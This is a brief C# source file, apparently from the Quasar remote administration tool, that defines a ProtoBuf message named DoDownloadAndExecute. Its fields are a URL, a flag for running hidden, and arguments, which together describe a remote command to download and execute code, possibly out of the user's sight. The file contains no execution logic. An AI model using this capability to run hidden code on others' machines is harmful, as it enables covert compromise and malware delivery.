using ProtoBuf;

namespace Quasar.Common.Messages
{
    [ProtoContract]
    public class DoDownloadAndExecute : IMessage
    {
        [ProtoMember(1)]
        public string Url { get; set; }

        [ProtoMember(2)]
        public bool RunHidden { get; set; }

        [ProtoMember(3)]
        public string Arguments { get; set; }
    }
}
